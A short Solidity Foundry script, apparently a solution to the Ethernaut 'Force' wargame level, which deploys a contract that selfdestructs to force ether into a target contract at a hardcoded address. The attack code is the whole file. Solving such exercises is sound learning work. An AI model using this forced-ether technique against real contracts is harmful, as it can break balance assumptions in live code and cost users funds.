// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Force.sol";
import {Script} from "forge-std/Script.sol";

contract AttackContract {
    constructor(address _address) payable {
        selfdestruct(payable(_address));
    }
}

contract ForceAttack is Script {
    Force public force = Force(0x8Ec93b57E94c16C04dF92E14D3b1F764BEd0b1a9);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new AttackContract{value: 0.001 ether}(payable(address(force)));
        
        vm.stopBroadcast();
    }
}